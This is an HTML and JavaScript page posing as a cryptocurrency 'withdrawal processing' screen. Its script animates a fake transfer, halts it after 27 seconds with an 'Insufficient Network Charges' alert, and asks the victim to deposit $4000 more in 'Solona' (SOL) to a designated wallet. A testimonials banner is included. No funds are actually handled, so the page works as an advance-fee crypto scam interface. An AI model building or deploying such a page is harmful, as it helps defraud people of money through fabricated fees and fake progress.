<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Withdrawal Processing</title>
  <link rel="stylesheet" href="css/styles.css">
  <style>
    :root{--panel-padding:16px}
    body{margin:0;padding:20px;font-family:Inter,system-ui,Arial,Helvetica,sans-serif;background:var(--bg, #fafafa);color:var(--text,#111)}
    .testimonies-banner { width: 100%; padding: 8px 12px; position: relative; min-height: 36px; display: flex; align-items: center; margin-bottom: 16px; box-sizing: border-box; overflow: hidden; }
    .testimonies-banner-content { display: flex; gap: 24px; width: max-content; align-items: center; will-change: transform; }
    .testimonies-banner-item { display: flex; flex-direction: column; gap: 2px; flex-shrink: 0; padding: 12px 18px; background: rgba(251, 191, 36, 0.2); border-radius: 6px; backdrop-filter: blur(8px); font-size: 13px; color: #e0e7ff; border: 1.5px solid rgba(251, 191, 36, 0.6); min-width: 280px; max-width: 380px; }
    .testimonies-banner-item strong { color: #fbbf24; font-weight: 700; font-size: 12px; text-transform: uppercase; letter-spacing: 0.5px; }
    .testimonies-banner-item-text { font-style: italic; line-height: 1.3; font-size: 12px; color: #cbd5e1; }
    @keyframes scroll-left { from { transform: translateX(0); } to { transform: translateX(-50%); } }
    @media (max-width: 768px) { .testimonies-banner { padding: 6px 8px; min-height: 32px; margin-bottom: 12px; } .testimonies-banner-content { gap: 18px; } .testimonies-banner-item { padding: 10px 14px; font-size: 12px; min-width: 240px; max-width: 300px; border-radius: 5px; } .testimonies-banner-item strong { font-size: 11px; } .testimonies-banner-item-text { font-size: 11px; } }
    .wrap{max-width:980px;margin:0 auto;padding:12px}
    .card{background:var(--card,#fff);border:1px solid var(--border,#e6e6e6);padding:var(--panel-padding);border-radius:10px;margin-bottom:16px;box-shadow:0 1px 4px rgba(12,20,30,0.04)}
    h2,h3{margin:0 0 8px 0}
    label{display:block;margin-top:10px;font-weight:600;color:var(--muted)}
    input,select,textarea{width:100%;padding:10px;margin-top:6px;border:1px solid var(--border);border-radius:8px;background:var(--input-bg,#fff);box-sizing:border-box}
    .grid{display:grid;grid-template-columns:1fr;gap:12px}
    @media(min-width:720px){.grid{grid-template-columns:1fr 1fr}}
    .progress{height:14px;background:var(--border);border-radius:999px;overflow:hidden}
    .progress > i{display:block;height:100%;width:0;background:linear-gradient(90deg,var(--accent,#0b76ef),#2ea0ff)}
    .controls{display:flex;gap:10px;margin-top:12px;flex-wrap:wrap}
    button{padding:9px 12px;border:0;background:var(--accent,#0b76ef);color:#fff;border-radius:8px;cursor:pointer}
    button[disabled]{opacity:0.6;cursor:not-allowed}
    .status{font-weight:700;margin-left:10px;text-transform:capitalize}
    /* Keep long strings from overflowing */
    .wrap, input, textarea, select, .withdrawal-details {word-break:break-word;overflow-wrap:break-word}
    .summary-row{display:flex;justify-content:space-between;padding:6px 0;font-size:14px}
    @media(max-width:520px){.summary-row{flex-direction:column;gap:6px}}
  </style>
</head>
<body>
  <div class="wrap">
    <div id="testimonies-banner" class="testimonies-banner"></div>
    <h2>Withdrawal processing</h2>

    <div class="card">
      <h3>Transfer info</h3>
      <label>Digital currency transfer</label>
      <select id="digital">
        <option value="">Select currency</option>
        <option>BTC</option>
        <option>ETH</option>
        <option>USDT</option>
        <option>USDC</option>
        <option>XRP</option>
      </select>
      <div class="grid">
        <div>
          <label>Date</label>
          <input id="tdate" type="date" />
        </div>
        <div>
          <label>Destination country</label>
          <input id="destCountry" placeholder="Country" />
        </div>
      </div>
    </div>

    <div class="card">
      <h3>Beneficiary account</h3>
      <div class="grid">
        <div>
          <label>Account number</label>
          <input id="benAcct" />
        </div>
        <div>
          <label>Account name</label>
          <input id="benName" />
        </div>
      </div>
      <label>Personal ID</label>
      <input id="benId" />
      <label>Branch</label>
      <input id="benBranch" />
    </div>

    <div class="card">
      <h3>Summary</h3>
      <div id="summary">
        <div class="summary-row"><div>Digital currency:</div><div id="s-digital">-</div></div>
        <div class="summary-row"><div>Date:</div><div id="s-date">-</div></div>
        <div class="summary-row"><div>Destination country:</div><div id="s-dest">-</div></div>
        <div style="margin-top:8px"><strong>Beneficiary:</strong>
          <div class="summary-row"> <div>Account number</div><div id="s-benAcct">-</div></div>
          <div class="summary-row"> <div>Account name</div><div id="s-benName">-</div></div>
          <div class="summary-row"> <div>Personal ID</div><div id="s-benId">-</div></div>
          <div class="summary-row"> <div>Branch</div><div id="s-benBranch">-</div></div>
        </div>
      </div>
    </div>

    <div class="card">
      <h3>Transfer details</h3>
      <label>From account</label>
      <input id="fromAcct" />
      <div class="grid">
        <div>
          <label>Transfer currency</label>
          <input id="xcur" placeholder="USD, NGN, etc." />
        </div>
        <div>
          <label>Exchange rate</label>
          <input id="rate" type="number" step="any" />
        </div>
      </div>
      <label>Transfer amount</label>
      <input id="amount" type="number" step="any" />
    </div>

    <div class="card">
      <h3>Other details & progress</h3>
      <label>Transfer details / notes</label>
      <textarea id="notes" rows="3"></textarea>

      <div style="margin-top:12px">
        <div style="display:flex;align-items:center">
          <div style="flex:1">
            <div class="progress"><i id="bar"></i></div>
          </div>
          <div class="status" id="status">pending</div>
        </div>
        <div class="controls">
          <button id="start">Start transfer</button>
          <button id="cancel" style="background:#d33">Cancel</button>
        </div>
      </div>
    </div>

      <div id="feeAlertContainer" style="max-width:900px;margin:0 auto">
        <div class="card" style="display:none" id="feeAlert">
          <p><strong>Withdrawal Interrupted: Insufficient Network Charges</strong></p>
          <p>A network fee of <strong id="feeRequired">$5500.00</strong> is required to cover "Solona" blockchain charges for this transaction.</p>
          <p>Amount paid so far: <strong id="feePaid">$1500.00</strong>. Remaining: <strong id="feeRemaining">$4000.00</strong>.</p>
          <div class="progress" aria-hidden="true" style="height:10px;margin-top:8px;">
            <i id="feeBar" style="background:linear-gradient(90deg,#ffd56b,#ffa500);width:0;height:100%"></i>
          </div>
          <p style="font-size:0.9em;margin-top:6px;" id="feePct">27% of network fee paid</p>
          <p>Please deposit the remaining amount of <strong id="feeRemaining2">$4000.00</strong> worth of <strong>Solona</strong> (SOL) to the designated wallet to successfully complete your withdrawal.</p>
          <div style="margin-top:10px;display:flex;gap:8px">
            <button id="payFeeBtn" class="btn">Simulate Pay Remaining Fee</button>
            <button id="cancelFeeBtn" class="btn" style="background:#d33">Cancel Withdrawal</button>
          </div>
        </div>
      </div>
  </div>

  <script>
    const bar = document.getElementById('bar');
    const statusEl = document.getElementById('status');
    let pct = 0; let timer = null;

    function setPct(v){ pct = Math.max(0, Math.min(100, v)); bar.style.width = pct + '%'; }

    function populateSummary(){
      document.getElementById('s-digital').textContent = document.getElementById('digital').value || '-';
      document.getElementById('s-date').textContent = document.getElementById('tdate').value || '-';
      document.getElementById('s-dest').textContent = document.getElementById('destCountry').value || '-';
      document.getElementById('s-benAcct').textContent = document.getElementById('benAcct').value || '-';
      document.getElementById('s-benName').textContent = document.getElementById('benName').value || '-';
      document.getElementById('s-benId').textContent = document.getElementById('benId').value || '-';
      document.getElementById('s-benBranch').textContent = document.getElementById('benBranch').value || '-';
    }

    function startTransfer(){
      if(timer) return;
      populateSummary();
      statusEl.textContent = 'transferring';
      // load at ~3% per second (3/sec -> 3 percentage points per second)
      timer = setInterval(()=>{
        setPct(pct + 3);
        if(pct >= 100){
          clearInterval(timer); timer = null; statusEl.textContent = 'completed';
        }
      }, 1000);
      // disable start while running
      document.getElementById('start').disabled = true;
      // Show fee alert after 27 seconds if network fees insufficient
        const feeTimer = setTimeout(() => {
          const feeCard = document.getElementById('feeAlert');
          if (!feeCard) return;
          // pause transfer simulation
          pauseTransferForFee();
          feeCard.style.display = 'block';
          // animate fee bar to 27%
          const feeBar = document.getElementById('feeBar');
          if (feeBar) {
            feeBar.style.transition = 'width 1.5s ease';
            requestAnimationFrame(()=> feeBar.style.width = '27%');
          }
          const feePct = document.getElementById('feePct');
          if (feePct) feePct.textContent = '27% of network fee paid';

          // hook up pay and cancel buttons
          const payBtn = document.getElementById('payFeeBtn');
          const cancelBtn = document.getElementById('cancelFeeBtn');
          if (payBtn) {
            payBtn.onclick = async () => {
              // simulate paying remaining fee: animate to 100%
              if (feeBar) {
                feeBar.style.transition = 'width 1.2s ease';
                feeBar.style.width = '100%';
              }
              if (document.getElementById('feePct')) document.getElementById('feePct').textContent = '100% of network fee paid';
              // after animation, hide alert and resume transfer
              setTimeout(()=>{
                feeCard.style.display = 'none';
                resumeTransferAfterFee();
              }, 1400);
            };
          }
          if (cancelBtn) {
            cancelBtn.onclick = () => {
              // cancel full transfer
              cancelTransfer();
              feeCard.style.display = 'none';
              statusEl.textContent = 'cancelled';
            };
          }
        }, 27000);
    }

    function cancelTransfer(){
      if(timer) clearInterval(timer);
      timer = null; statusEl.textContent = 'cancelled';
      document.getElementById('start').disabled = false;
    }

    // Pause transfer when fee alert appears
    let interrupted = false;
    let interruptedPct = 0;
    function pauseTransferForFee(){
      if(timer) {
        clearInterval(timer);
        timer = null;
        interrupted = true;
        interruptedPct = pct;
        statusEl.textContent = 'interrupted';
        document.getElementById('start').disabled = true;
      }
    }

    function resumeTransferAfterFee(){
      if(!interrupted) return startTransfer();
      interrupted = false;
      // resume from interruptedPct
      setPct(interruptedPct);
      statusEl.textContent = 'transferring';
      timer = setInterval(()=>{
        setPct(pct + 3);
        if(pct >= 100){
          clearInterval(timer); timer = null; statusEl.textContent = 'completed';
          document.getElementById('start').disabled = false;
        }
      }, 1000);
    }

    document.getElementById('start').addEventListener('click', startTransfer);
    document.getElementById('cancel').addEventListener('click', cancelTransfer);

    // reset on load
    setPct(0);
    statusEl.textContent = 'pending';

    // Populate fields from query params (when navigated from withdrawals page)
    function populateFromQuery(){
      const params = new URLSearchParams(window.location.search);
      if(!params) return;
      const wId = params.get('id');
      const crypto = params.get('crypto');
      const amount = params.get('amount');
      const addr = params.get('address');
      const dest = params.get('country');
      const benAcct = params.get('benAcct');
      const benName = params.get('benName');

      if(crypto) document.getElementById('digital').value = crypto;
      if(params.get('date')) document.getElementById('tdate').value = params.get('date');
      if(dest) document.getElementById('destCountry').value = dest;
      if(benAcct) document.getElementById('benAcct').value = benAcct;
      if(benName) document.getElementById('benName').value = benName;
      if(params.get('id')){
        // auto-start transfer simulation when an id is present
        statusEl.textContent = 'transferring';
        setPct(3);
        // ensure summary reflects query values
        populateSummary();
        startTransfer();
      }
    }

    populateFromQuery();
  </script>
  <script src="js/theme-switcher.js"></script>
  <script src="js/testimonies.js"></script>
  <script src="js/scrolling-banner.js"></script>
</body>
</html>
